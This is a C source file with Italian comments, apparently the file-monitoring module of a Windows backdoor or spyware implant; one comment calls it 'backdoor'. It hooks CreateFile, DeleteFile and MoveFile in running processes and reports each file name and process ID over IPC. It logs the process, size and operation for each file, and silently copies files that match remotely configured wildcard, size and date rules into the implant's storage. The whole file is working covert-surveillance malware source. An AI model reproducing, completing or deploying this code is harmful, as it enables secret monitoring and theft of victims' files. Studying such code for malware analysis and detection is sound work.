#include <shlwapi.h>

#define MAXFILELEN (_MAX_PATH * 2 + 2) // Lunghezza per un nome widechar

// Struttura usata internamente  per
// i pattern di cattura file
typedef struct {
	DWORD accept_count;
	DWORD deny_count;
	WCHAR **accept_list;
	WCHAR **deny_list;
} pattern_list_struct;
pattern_list_struct pattern_list;

typedef DWORD (__stdcall *GetCurrentProcessId_t)(void);
typedef struct {
	COMMONDATA;
	GetCurrentProcessId_t pGetCurrentProcessId;
} CreateFileStruct;
CreateFileStruct CreateFileData;

typedef struct {
	char szFileName[MAXFILELEN];
	DWORD dwOperation;
	DWORD dwPid;
} IPCCreateFileStruct;

BOOL bPM_FileAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
DWORD min_fsize = 0, max_fsize = 0; // Dimensione minima e massima di un file che puo' essere catturato 
BOOL log_file_open = TRUE;
nanosec_time min_date; // Data minima di un file che puo' essere catturato

// Dichiarato in SM_EventHandlers.h
extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);


// -- Wrapper CreateFileA e CreateFileW
static HANDLE _stdcall PM_CreateFile(DWORD ARG1,
									  DWORD ARG2,
									  DWORD ARG3,
									  DWORD ARG4,
									  DWORD ARG5,
									  DWORD ARG6,
									  DWORD ARG7)
{
	IPCCreateFileStruct IPCFileData;
	char *pTmp;
	DWORD i;
	BOOL *Active;
	
	MARK_HOOK

	pTmp = NULL;

	INIT_WRAPPER(CreateFileStruct);

	CALL_ORIGINAL_API(7);

	Active = (BOOL *)pData->pHM_IpcCliRead(PM_FILEAGENT);

	// Controlla se il monitor e' attivo
	if (!Active || !(*Active) || ((HANDLE) ret_code) == INVALID_HANDLE_VALUE)
		return (HANDLE) ret_code;
	
	pTmp = (char *)ARG1;
	
	if( !pTmp || !((DWORD)pData->pHM_IpcCliWrite))
		return (HANDLE) ret_code;

	for (i=0; i<(MAXFILELEN-2); i+=2) {
		IPCFileData.szFileName[i]   = pTmp[i];
		IPCFileData.szFileName[i+1] = pTmp[i+1];
		if (IPCFileData.szFileName[i]==0 && IPCFileData.szFileName[i+1]==0)
			break;
	}

	// Forza la terminazione
	IPCFileData.szFileName[i]   = 0;
	IPCFileData.szFileName[i+1] = 0;

	IPCFileData.dwOperation = ARG2;
	IPCFileData.dwPid = pData->pGetCurrentProcessId();
		
	pData->pHM_IpcCliWrite(PM_FILEAGENT, (BYTE *)&IPCFileData, sizeof(IPCCreateFileStruct), 0, IPC_DEF_PRIORITY);

	return (HANDLE) ret_code;
}


static DWORD PM_CreateFile_setup(HMServiceStruct * pData)
{
	HMODULE hMod;

	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"))
	VALIDPTR(CreateFileData.pGetCurrentProcessId = (GetCurrentProcessId_t) HM_SafeGetProcAddress(hMod, "GetCurrentProcessId"))

	CreateFileData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	CreateFileData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	CreateFileData.dwHookLen = 900;
	
	// --- se si tratta di un rundll32 non gli facciamo 
	// fare gli hook per il file capture. Perderemo magari alcuni
	// file aperti (molto improbabile), ma eviteremo loop infiniti
	// se la backdoor dovesse partire wrappata
	char proc_path[DLLNAMELEN];
	char *proc_name;
	ZeroMemory(proc_path, sizeof(proc_path));
	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
	proc_name = strrchr(proc_path, '\\');

	if (proc_name) {
		proc_name++;
		if (!stricmp(proc_name, "rundll32.exe"))
			return 1;
	} 

	return 0;
}

// -- Wrapper DeleteFileA e DeleteFileW
static BOOL _stdcall PM_DeleteFile(DWORD ARG1)
{
	IPCCreateFileStruct IPCFileData;
	char *pTmp;
	DWORD i,j;
	BOOL *Active;

	MARK_HOOK

	pTmp = NULL;
	
	INIT_WRAPPER(CreateFileStruct);

	CALL_ORIGINAL_API(1);

	Active = (BOOL *)pData->pHM_IpcCliRead(PM_FILEAGENT);

	// Controlla se il monitor e' attivo e se la funzione
	// e' tornata con successo
	if (!Active || !(*Active) || ((BOOL) ret_code) == FALSE)
		return (BOOL) ret_code;
	
	pTmp = (char *)ARG1;
	
	if( !pTmp || !((DWORD)pData->pHM_IpcCliWrite))
		return (BOOL) ret_code;

	for (i=0; i<(MAXFILELEN-2); i+=2) {
		IPCFileData.szFileName[i]   = pTmp[i];
		IPCFileData.szFileName[i+1] = pTmp[i+1];
		if (IPCFileData.szFileName[i]==0 && IPCFileData.szFileName[i+1]==0)
			break;
	}

	// Forza la terminazione
	IPCFileData.szFileName[i]   = 0;
	IPCFileData.szFileName[i+1] = 0;

	IPCFileData.dwOperation = DELETE; 
	IPCFileData.dwPid = pData->pGetCurrentProcessId();
		
	pData->pHM_IpcCliWrite(PM_FILEAGENT, (BYTE *)&IPCFileData, sizeof(IPCCreateFileStruct), 0, IPC_DEF_PRIORITY);

	return (BOOL) ret_code;
}

// -- Wrapper MoveFileA e MoveFileW
static BOOL _stdcall PM_MoveFile(DWORD ARG1, DWORD ARG2)
{
	IPCCreateFileStruct IPCFileData;
	char *pTmp;
	DWORD i,j;
	BOOL *Active;
	
	MARK_HOOK

	pTmp = NULL;

	INIT_WRAPPER(CreateFileStruct);

	CALL_ORIGINAL_API(2);

	Active = (BOOL *)pData->pHM_IpcCliRead(PM_FILEAGENT);

	// Controlla se il monitor e' attivo e se la funzione
	// e' tornata con successo
	if (!Active || !(*Active) || ((BOOL) ret_code) == FALSE)
		return (BOOL) ret_code;
	
	pTmp = (char *)ARG1;
	
	if( !pTmp || !((DWORD)pData->pHM_IpcCliWrite))
		return (BOOL) ret_code;

	// Notifica il file sorgente come cancellato
	for (i=0; i<(MAXFILELEN-2); i+=2) {
		IPCFileData.szFileName[i]   = pTmp[i];
		IPCFileData.szFileName[i+1] = pTmp[i+1];
		if (IPCFileData.szFileName[i]==0 && IPCFileData.szFileName[i+1]==0)
			break;
	}

	// Forza la terminazione
	IPCFileData.szFileName[i]   = 0;
	IPCFileData.szFileName[i+1] = 0;

	IPCFileData.dwOperation = DELETE; 		
	IPCFileData.dwPid = pData->pGetCurrentProcessId();
	pData->pHM_IpcCliWrite(PM_FILEAGENT, (BYTE *)&IPCFileData, sizeof(IPCCreateFileStruct), 0, IPC_DEF_PRIORITY);


	// Notifica il file destinazione come creato
	pTmp = (char *)ARG2;
	if( !pTmp || !((DWORD)pData->pHM_IpcCliWrite))
		return (BOOL) ret_code;

	for (i=0; i<(MAXFILELEN-2); i+=2) {
		IPCFileData.szFileName[i]   = pTmp[i];
		IPCFileData.szFileName[i+1] = pTmp[i+1];
		if (IPCFileData.szFileName[i]==0 && IPCFileData.szFileName[i+1]==0)
			break;
	}

	// Forza la terminazione
	IPCFileData.szFileName[i]   = 0;
	IPCFileData.szFileName[i+1] = 0;

	IPCFileData.dwOperation = GENERIC_WRITE; 		
	IPCFileData.dwPid = pData->pGetCurrentProcessId();
	pData->pHM_IpcCliWrite(PM_FILEAGENT, (BYTE *)&IPCFileData, sizeof(IPCCreateFileStruct), 0, IPC_DEF_PRIORITY);

	return (BOOL) ret_code;
}

// Torna TRUE se il path e' su harddisk
BOOL IsFixedDrive(char *path)
{
	UINT drv_type;
	char driver_letter[4];
	if (path[1]!=':' || path[2]!='\\')
		return FALSE;

	memcpy(driver_letter, path, 4);
	driver_letter[3]=0;
	drv_type = GetDriveType(driver_letter);

	if (drv_type==DRIVE_REMOVABLE || drv_type==DRIVE_REMOTE || drv_type==DRIVE_CDROM)
		return FALSE;

	return TRUE;
}

// Popola la lista di pattern da includere/escludere
void PopulatePatternList(JSONObject conf_list)
{
	DWORD i;
	JSONArray accept, deny;

	// Libera una precedente lista (se presente)
	for (i=0; i<pattern_list.accept_count; i++)
		SAFE_FREE(pattern_list.accept_list[i]);
	SAFE_FREE(pattern_list.accept_list);
	pattern_list.accept_count = 0;

	for (i=0; i<pattern_list.deny_count; i++)
		SAFE_FREE(pattern_list.deny_list[i]);
	SAFE_FREE(pattern_list.deny_list);
	pattern_list.deny_count = 0;

	// Vede se deve loggare i file open
	log_file_open = (BOOL) conf_list[L"open"]->AsBool();
	accept = conf_list[L"accept"]->AsArray();
	deny = conf_list[L"deny"]->AsArray();

	// Alloca le due liste
	if (accept.size() > 0) {
		pattern_list.accept_list = (WCHAR **)malloc(accept.size() * sizeof(WCHAR *));
		if (!pattern_list.accept_list)
			return;
	}

	if (deny.size() > 0) {
		pattern_list.deny_list = (WCHAR **)malloc(deny.size() * sizeof(WCHAR *));
		if (!pattern_list.deny_list) {
			SAFE_FREE(pattern_list.accept_list);
			return;
		}
	}

	pattern_list.accept_count = accept.size();
	pattern_list.deny_count = deny.size();

	// ...e parsa tutte le stirnghe unicode
	for (i=0; i<pattern_list.accept_count; i++) 
		pattern_list.accept_list[i] = wcsdup(accept[i]->AsString().c_str());
	for (i=0; i<pattern_list.deny_count; i++) 
		pattern_list.deny_list[i] = wcsdup(deny[i]->AsString().c_str());
}

// Compara due stringhe con wildcard
// torna 0 se le stringhe sono diverse
int CmpWild(const unsigned char *wild, const unsigned char *string) {
  const unsigned char *cp = NULL, *mp = NULL;

  while ((*string) && (*wild != '*')) {
    if ((toupper((unsigned int)*wild) != toupper((unsigned int)*string)) && (*wild != '?')) {
      return 0;
    }
    wild++;
    string++;
  }

  while (*string) {
    if (*wild == '*') {
      if (!*++wild) {
        return 1;
      }
      mp = wild;
      cp = string+1;
    } else if ((toupper((unsigned int)*wild) == toupper((unsigned int)*string)) || (*wild == '?')) {
      wild++;
      string++;
    } else {
      wild = mp;
      string = cp++;
    }
  }

  while (*wild == '*') {
    wild++;
  }
  return !*wild;
}

// Compara due stringhe con wildcard
// torna 0 se le stringhe sono diverse
int CmpWildW(WCHAR *wild, WCHAR *string) 
{
	WCHAR *cp = NULL, *mp = NULL;

	while ((*string) && (*wild != '*')) {
		if ((towupper((WCHAR)*wild) != towupper((WCHAR)*string)) && (*wild != '?')) {
			return 0;
		}
		wild++;
		string++;
	}

	while (*string) {
		if (*wild == '*') {
			if (!*++wild) {
				return 1;
			}

			mp = wild;
			cp = string+1;
		} else if ((towupper((WCHAR)*wild) == towupper((WCHAR)*string)) || (*wild == '?')) {
			wild++;
			string++;
		} else {
			wild = mp;
			string = cp++;
		}
	}

	while (*wild == '*') {
		wild++;
	}

	return !*wild;
}



// Verifica le condizioni per la copia del file
// nello storage.
BOOL IsToCopy(WCHAR *file_name, BOOL *exceed_size)
{
	HANDLE hfile;
	BY_HANDLE_FILE_INFORMATION file_info;
	nanosec_time file_date;

	// XXX Controlla se e' su un disco rimovibile 
	//if (IsFixedDrive(file_name)) 
		//return FALSE;

	// Prende le informazioni del file 
	hfile = FNC(CreateFileW)(file_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	if (!FNC(GetFileInformationByHandle)(hfile, &file_info)) {
		CloseHandle(hfile);
		return FALSE;
	}
	CloseHandle(hfile);
	
	// Check sui vincoli di dimensione
	if (file_info.nFileSizeHigh>0 || file_info.nFileSizeLow<min_fsize || file_info.nFileSizeLow>=max_fsize)
		*exceed_size = TRUE;
	else 
		*exceed_size = FALSE;

	// Check sul vincolo della data
	file_date.hi_delay = file_info.ftLastWriteTime.dwHighDateTime;
	file_date.lo_delay = file_info.ftLastWriteTime.dwLowDateTime;
	if (IsGreaterDate(&min_date, &file_date))
		return FALSE;

	return TRUE;
}


// Controlla la lista di pattern da accettare e escludere
// torna TRUE se il pattern va loggato.
// Per passare, il nome deve matchare la accept e poi non matchare la deny.
// Se l'accept e' vuota non viene loggato niente.
BOOL IsToLog(WCHAR *file_name, WCHAR *proc_name)
{
	DWORD i;
	BOOL accept = FALSE;
	WCHAR *check_filename, check_procname[MAX_PATH], *temp_ptr, consistent_proc_name[MAX_PATH];

	if (!file_name)
		return FALSE;

	// Se non sono riuscito a leggere il nome del processo, lo setto a un valore che potra' matchare
	// solo con '*'
	if (proc_name)
		_snwprintf_s(consistent_proc_name, sizeof(consistent_proc_name)/sizeof(WCHAR), _TRUNCATE, L"%s", proc_name);		
	else
		_snwprintf_s(consistent_proc_name, sizeof(consistent_proc_name)/sizeof(WCHAR), _TRUNCATE, L"UNKNOWN");		

	// Cerca nella lista dei pattern di accept
	for(i=0; i<pattern_list.accept_count; i++) {
		if (!pattern_list.accept_list[i]) 
			continue;
		// Se e' nel formato processo|file
		if (check_filename = wcschr(pattern_list.accept_list[i], L'|')) {
			check_filename++;
			_snwprintf_s(check_procname, sizeof(check_procname)/sizeof(WCHAR), _TRUNCATE, L"%s", pattern_list.accept_list[i]);		
			if (temp_ptr = wcschr(check_procname, L'|')) 
				*temp_ptr = 0;
		} else {
			check_filename = pattern_list.accept_list[i];
			_snwprintf_s(check_procname, sizeof(check_procname)/sizeof(WCHAR), _TRUNCATE, L"*");		
		}

		if (CmpWildW(check_filename, file_name) && CmpWildW(check_procname, consistent_proc_name)) {
			accept = TRUE;
			break;
		}	
	}

	if (!accept)
		return FALSE;

	// Cerca nella lista dei pattern di deny
	for(i=0; i<pattern_list.deny_count; i++) {
		if (!pattern_list.deny_list[i]) 
			continue;
		// Se e' nel formato processo|file
		if (check_filename = wcschr(pattern_list.deny_list[i], L'|')) {
			check_filename++;
			_snwprintf_s(check_procname, sizeof(check_procname)/sizeof(WCHAR), _TRUNCATE, L"%s", pattern_list.deny_list[i]);		
			if (temp_ptr = wcschr(check_procname, L'|')) 
				*temp_ptr = 0;
		} else {
			check_filename = pattern_list.deny_list[i];
			_snwprintf_s(check_procname, sizeof(check_procname)/sizeof(WCHAR), _TRUNCATE, L"*");		
		}

		if (CmpWildW(check_filename, file_name) && CmpWildW(check_procname, consistent_proc_name)) 
			return FALSE;
	}
	
	return TRUE;
}

#define READ_MODE   0x80000000
#define WRITE_MODE  0x40000000
#define EXEC_MODE   0x20000000
#define DELETE_MODE 0x00010000
DWORD __stdcall PM_FileAgentDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
{
	HANDLE hfile;
	DWORD hi_dim = 0, lo_dim = 0, ops;
	WCHAR *proc_name_to_compare;
	char *proc_name;
	BOOL exceed_size = FALSE;
	WCHAR *utf16_file_name;

	utf16_file_name = (WCHAR *)((IPCCreateFileStruct *) msg)->szFileName;

	proc_name_to_compare = HM_FindProcW(((IPCCreateFileStruct *)msg)->dwPid);

	// Logga il nome del file se e' incluso nella lista dei pattern
	if(IsToLog(utf16_file_name, proc_name_to_compare)) {
		if (log_file_open) {
			// Scrive anche la dimensione del file.
			hfile = FNC(CreateFileW)(utf16_file_name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
			if (hfile != INVALID_HANDLE_VALUE) {
				lo_dim = FNC(GetFileSize)(hfile, &hi_dim);
				if (lo_dim == INVALID_FILE_SIZE) {
					lo_dim = hi_dim = 0;
				}
				CloseHandle(hfile);
			}

			// Logga i dati del file aperto (nome, dimensione, etc.)
			bin_buf tolog;
			struct tm tstamp;
			DWORD delimiter = ELEM_DELIMITER;

			ops = ((IPCCreateFileStruct *) msg)->dwOperation;
			proc_name = HM_FindProc(((IPCCreateFileStruct *)msg)->dwPid);
			GET_TIME(tstamp);

			tolog.add(&tstamp, sizeof(tstamp));
			if (proc_name) {
				tolog.add(proc_name, strlen(proc_name)+1);
				SAFE_FREE(proc_name);
			} else
				tolog.add("UNKNOWN", strlen("UNKNOWN")+1);
			tolog.add(&hi_dim, sizeof(hi_dim));
			tolog.add(&lo_dim, sizeof(lo_dim));
			tolog.add(&ops, sizeof(ops));
			tolog.add(utf16_file_name, (wcslen(utf16_file_name)*2)+2);
			tolog.add(&delimiter, sizeof(DWORD));

			LOG_ReportLog(PM_FILEAGENT, tolog.get_buf(), tolog.get_len());
		}

		// Vede se deve copiare tutto il file nello storage
		if (IsToCopy(utf16_file_name, &exceed_size)) 
			Log_CopyFile(utf16_file_name, NULL, exceed_size, PM_FILEAGENT_CAPTURE);
	}
	SAFE_FREE(proc_name_to_compare);
	return 1;
}


DWORD __stdcall PM_FileAgentStartStop(BOOL bStartFlag, BOOL bReset)
{
	// Lo fa per prima cosa, anche se e' gia' in quello stato
	// Altrimenti quando gli agenti sono in suspended(per la sync) e ricevo una conf
	// che li mette in stop non verrebbero fermati realmente a causa del check
	// if (bPM_KeyLogStarted == bStartFlag) che considera suspended e stopped uguali.
	// Gli agenti IPC non vengono stoppati quando in suspend (cosi' cmq mettono in coda
	// durante la sync).
	if (bReset)
		AM_IPCAgentStartStop(PM_FILEAGENT, bStartFlag);

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_FileAgentStarted == bStartFlag)
		return 0;

	// I log va inizializzato come prima cosa...
	if (bStartFlag && !LOG_InitAgentLog(PM_FILEAGENT))
		return 0;

	// bStartFlag e' TRUE se il monitor deve essere attivato
	bPM_FileAgentStarted = bStartFlag;

	// ...e va chiuso come ultima
	if (!bStartFlag)
		LOG_StopAgentLog(PM_FILEAGENT);
		
	return 1;
}


DWORD __stdcall PM_FileAgentInit(JSONObject elem)
{
	FILETIME ftime;

	PopulatePatternList(elem);

	if ((BOOL)elem[L"capture"]->AsBool()) {
		min_fsize = (DWORD) elem[L"minsize"]->AsNumber();
		max_fsize = (DWORD) elem[L"maxsize"]->AsNumber();
		HM_TimeStringToFileTime(elem[L"date"]->AsString().c_str(), &ftime); 
		min_date.hi_delay = ftime.dwHighDateTime;
		min_date.lo_delay = ftime.dwLowDateTime;

	} else {
		min_fsize = max_fsize = 0;
		HM_TimeStringToFileTime(L"2100-01-01 00:00:00", &ftime); 
		min_date.hi_delay = ftime.dwHighDateTime;
		min_date.lo_delay = ftime.dwLowDateTime;		
	}

	return 1;
}


void PM_FileAgentRegister()
{
	AM_MonitorRegister(L"file", PM_FILEAGENT, (BYTE *)PM_FileAgentDispatch, (BYTE *)PM_FileAgentStartStop, (BYTE *)PM_FileAgentInit, NULL);
}